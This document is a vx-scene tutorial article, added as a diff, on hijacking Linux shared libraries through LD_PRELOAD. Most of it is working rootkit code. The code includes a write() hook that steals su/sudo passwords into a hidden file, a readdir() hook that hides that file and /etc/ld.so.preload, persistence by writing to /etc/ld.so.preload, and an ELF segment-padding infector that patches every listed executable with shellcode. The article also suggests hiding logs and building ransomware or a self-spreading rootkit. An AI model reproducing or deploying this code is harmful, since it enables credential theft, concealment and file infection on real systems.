@@ -1,0 +1,302 @@
+************************************************
+** Playing with LD_PRELOAD for fun and profit **
+***		         - By S01den -		         ***
+************************************************
+
+[Introduction]
+
+This text will present some ways to make fun by hijacking shared libraries under Linux.
+LD_PRELOAD based tricks have long been known, it can be used for game hacking 
+(yes, game hacking under linux, pretty useful...) or reverse engineering, but I think
+the most powerful and interesting way to use it is in userland rootkits (like Jynx for example).
+Here, I'll explain a vx-related way to use this trick.
+This include a short explanation about code injection into ELF binaries with segment padding infection.
+
+[The LD_PRELOAD trick]
+
+Imagine your best friend Timmy just began to learn C.
+He shows you proudly his first creation: a guess-my-number game !
+In order to generate a random number he uses the rand() function.
+However, the game is frustrating as fuck; you have to guess a number between 0 and 3735928559 in one try.
+Impossible ?
+Nope, because you know how to hijack the rand() function !
+(we assume that Timmy's game is dynamically linked)
+
+You just need to write to make your own rand() function returning a constant, like that:
+
+----------------
+int rand()
+{
+	return 1337;
+}
+----------------
+
+Compile as a shared library thus: 
+gcc -shared -fPIC fuckRand.c -o fuckRand.so
+
+And rewrite the LD_PRELOAD environment variable: 
+export LD_PRELOAD=$PWD/fuckRand.so
+
+Run the Timmy's game and enter 1337, wow congratulation you won.
+But what is the black magic, how does it work ?
+
+Rand() is a libc function, and almost every dynamically linked binaries in Linux are linked with the libc.
+So, this little game too:
+
+[solden@solden]$ ldd ./guess
+	linux-vdso.so.1 (0x00007ffce65c1000)
+	libc.so.6 => /usr/lib/libc.so.6 (0x00007f7412940000)  <- The libc !
+	/lib64/ld-linux-x86-64.so.2 => /usr/lib64/ld-linux-x86-64.so.2 (0x00007f7412b49000)
+
+Now, what happens with the LD_PRELOAD variable ?
+This environment variable forces a specified librarie to be loaded at first for a program.
+After "export LD_PRELOAD=$PWD/fuckRand.so", with ldd we obtain:
+
+[solden@solden]$ ldd ./guess
+	linux-vdso.so.1 (0x00007fff3a5da000)
+	/home/solden/fuckRand.so (0x00007f01ab329000)    <- our "malicious" shared library is loaded before the libc
+	libc.so.6 => /usr/lib/libc.so.6 (0x00007f01ab12c000)
+	/lib64/ld-linux-x86-64.so.2 => /usr/lib64/ld-linux-x86-64.so.2 (0x00007f01ab335000)
+
+So the program will use OUR rand(), not the libc's one.
+Ok, it's fun, but just setting up an environment variable isn't; you must rewrite the envar at every reboot...
+Fortunately, there is a file, /etc/ld.so.preload, which the dynamic linker consults every time it executes a program.
+So instead of "export LD_PRELOAD=$PWD/fuckRand.so", do "echo $PWD/fuckRand.so >> /etc/ld.so.preload"
+
+
+[Hiding file and SU-trojan]
+
+Yeah, I know it must be pretty boring for the moment, but now it's time to get serious.
+In the introduction, I said that this technic is often used in userland rootkits, but why ?
+The write() function (always from the libc), is used everyhere ! 
+For each displayed string, you can assume that write() isn't far away. 
+
+So you can simply hook write() to trigger something when the thing you want is displayed.
+(Note: write is also used to write in logs file ! So you can hijack it to write problematic logs into /dev/null)
+Let's take an example by turn write() into a simple SU-trojan (hijack the su prompt to grab the root password):
+
+--------------------------------------------------------------------------------------------------------------------------
+#include <dlfcn.h>
+
+ssize_t write(int fildes, const void *buf, size_t nbytes) 
+{
+	ssize_t (*new_write)(int fildes, const void *buf, size_t nbytes);
+	ssize_t result;
+	new_write = dlsym(RTLD_NEXT, "write"); // now, our new_write() has the same address than the original write()
+
+	char *triggerPasswd = strstr(buf, "[sudo]"); // prompt on su
+	char *pass;
+	char *getpass();
+	
+	if(triggerPasswd != NULL && access(".su_logs",F_OK) == -1) // if [sudo] is displayed and the password is not yet logged, grab it !
+	{
+		FILE *suLogs = fopen(".su_logs","w+");
+		result = new_write(fildes, buf, nbytes);
+		pass = getpass(" ");
+		fprintf(suLogs, "%s\n", pass);
+		fclose(suLogs);
+	}
+	else // else, use write normally
+	{
+		result = new_write(fildes,buf,nbytes);
+	}
+
+	return result;
+}
+--------------------------------------------------------------------------------------------------------------------------
+
+Now, we must hide the .su_logs and /etc/ld.so.preload files, otherwise a simple ls -al could reveal the presence of the "rootkit".
+How ? By hooking readdir() !
+This function is used by /bin/ls to list files in a directory.
+man give us the prototype: 
+
+int readdir(DIR *dir, struct dirent *entry, struct dirent **result);
+
+Here, only the first parameter interests us; let's rewrite readdir() like we rewrote write():
+
+--------------------------------------------------------------------------------------------------------------------------
+#include <dlfcn.h>
+
+struct dirent *readdir(DIR *dirprint)
+{
+	struct dirent *(*new_readdir)(DIR *dir);
+	struct dirent *dir;
+    new_readdir = dlsym(RTLD_NEXT, "readdir");
+
+    while(dir = new_readdir(dirprint))
+    {
+        if(strstr(dir->d_name,".su_logs") == NULL)
+        {
+        	break;
+        }
+    }
+    while(dir = new_readdir(dirprint)) // dunno why but we have to use two loops otherwise it doesn't work
+    {
+        if(strstr(dir->d_name,"ld.so.preload") == NULL)
+        {
+        	break;
+        }
+    }
+    return dir;
+}
+--------------------------------------------------------------------------------------------------------------------------
+
+Now, file listing doesn't bother us anymore !
+
+[The Infector]
+
+Now, imagine this kind of thing infecting executable files when they're displayed by file listing...
+Could we hijack readdir in order to infect every executable file it finds with a payload ? It would be pretty powerful...
+Let's try !
+
+--------------------------------------------------------------------------------------------------------------------------
+struct dirent *readdir(DIR *dirprint)
+{
+	struct dirent *(*new_readdir)(DIR *dir);
+	struct dirent *dir;
+    new_readdir = dlsym(RTLD_NEXT, "readdir");
+
+    while(dir = new_readdir(dirprint))
+    {
+        if(strstr(dir->d_name,FILENAME) == NULL)
+        {
+        	break;
+        }
+    }
+    while(dir = new_readdir(dirprint)) // dunno why but we have to use two loops
+    {
+        if(strstr(dir->d_name,SULOGS) == NULL)
+        {
+        	break;
+        }
+        else
+        {
+        	infect(dir->d_name);
+        }
+    }
+
+    return dir;
+}
+
+int infect(char *name) // injection through segment padding infection
+{
+	FILE *file_to_infect = fopen(name,"r+");
+	Elf32_Ehdr header; // header
+	fread(&header, 1, sizeof(header), file_to_infect);
+	
+	fseek(file_to_infect , 0 , SEEK_END); // get the file size
+	long lenFile = ftell(file_to_infect);
+	rewind(file_to_infect); 
+
+	unsigned char *content_file;
+	unsigned char payload[] = "\x31\xc0\xb0\x04\x31\xdb\xb3\x01\x31\xd2\x52\x52\x6a\x0a\x68\x72\x6c\x64\x21\x68\x6f\x20\x57\x6f\x68\x48\x65\x6c\x6c\x89\xe1\xb2\x0d\xcd\x80";
+	// a simple shellcode displaying "Hello, World!"
+	unsigned char ret_To_OEP[] = "\xbd\xde\xad\xbe\xef\xFF\xE5"; // mov ebp,0xdeadbeef (<-- replace with true entry point) ; jmp ebp
+
+	int lenPayload = strlen(payload) + strlen(ret_To_OEP);
+
+	content_file = (char *)malloc(sizeof(char)*lenFile+1);
+	memset(content_file, 0, sizeof(char)*lenFile+1);
+
+	fread(content_file, lenFile, 1, file_to_infect);
+
+	if(memcmp(header.e_ident, ELFMAG, SELFMAG) != 0) // check if the file is an ELF
+	{
+		fclose(file_to_infect);
+		free(content_file);
+		return -1;
+	}
+
+	if(header.e_phoff == 0)
+	{
+		fclose(file_to_infect);
+		free(content_file);
+		return -1;
+	}
+
+	fseek(file_to_infect, header.e_phoff, SEEK_SET);
+	// https://vx-underground.org/papers/ELF%20et%20virologie%20informatique.html
+
+	Elf32_Phdr seg; // segment table
+    Elf32_Half i;
+    Elf32_Half segNbr;
+    Elf32_Phdr dataSeg;
+    Elf32_Phdr textSeg;
+    int found = 0;
+
+	for (i = 0; i < header.e_phnum; ++i)  // parse the program header to get the text and segments
+	{
+		fread (&seg , sizeof(char), sizeof(Elf32_Phdr), file_to_infect);
+		if(seg.p_type == PT_LOAD && seg.p_flags & PF_X && seg.p_flags &  PF_R) // the text segment is Readable and Executable
+		{
+			textSeg = seg;
+			found++;
+		}
+		if(found > 0 && seg.p_type == PT_LOAD && seg.p_flags & PF_R && seg.p_flags & PF_W) // the data segment is Readable and Writable
+		{
+			dataSeg = seg;
+			found++;
+			break;
+		}
+	}
+
+	if(!found)
+	{
+		fclose(file_to_infect);
+		free(content_file);
+		return -1;
+	}
+
+	uint32_t OEP = header.e_entry;
+	uint32_t byte = 0;
+	uint32_t size_cave = dataSeg.p_vaddr - (textSeg.p_filesz + textSeg.p_vaddr); // the size available thanks to the segment padding
+	if(size_cave < lenPayload)
+	{
+		fclose(file_to_infect);
+		free(content_file);
+		return -1;		
+	}
+
+	uint32_t new_EP = textSeg.p_filesz + textSeg.p_vaddr;
+	int offset_new_EP = textSeg.p_offset + textSeg.p_filesz;
+	if(memcmp(&content_file[offset_new_EP],payload,4) == 0) // check is the file is already infected
+	{
+		fclose(file_to_infect);
+		free(content_file);
+		return -1;
+	}
+
+	memcpy(&content_file[24],&new_EP,4); // write the new EP
+	memcpy(ret_To_OEP + 1,&OEP,4); // patch the  "mov ebp,0xdeadbeef" to use the right addr
+	memcpy(&content_file[offset_new_EP],payload,sizeof(payload)); // inject the payload
+	memcpy(&content_file[offset_new_EP+strlen(payload)],ret_To_OEP,sizeof(ret_To_OEP)); // inject the code to go back into the OEP
+
+	rewind(file_to_infect); 
+	fwrite(content_file, lenFile, 1, file_to_infect);
+
+    fclose(file_to_infect);
+    free(content_file); // bye bye
+	return 0;
+}
+--------------------------------------------------------------------------------------------------------------------------
+
+We also could make a kind of ransomware for example, hijacking readdir to encrypt every file which is listed.
+
+
+[Conclusion]
+
+The payload here isn't very interesting, but I think a cool payload injected could be a piece of code which setup the rootkit if it isn't already in the system;
+making a kind of virus rootkit...
+The only limit of hooking is your creativity !
+This article is for educational purposes, don't do anything stupid with that, I'm not responsible for anything you could done.
+Long live to the vx scene !
+
+
+[Links]
+
+https://github.com/chokepoint/Jynx2/blob/master/jynx2.c
+https://h0mbre.github.io/Learn-C-By-Creating-A-Rootkit/
+https://gist.github.com/amitsaha/8169242
+https://medium.com/@compilepeace/memory-malware-part-0x2-writing-userland-rootkits-via-ld-preload-30121c8343d5
+https://vx-underground.org/papers/VXUG/Exclusive/Wormable%20SSH.txt
+https://web.archive.org/web/20170218150045/http://maitesin.github.io/Module_prank/ <---- a creative hook in a LKM
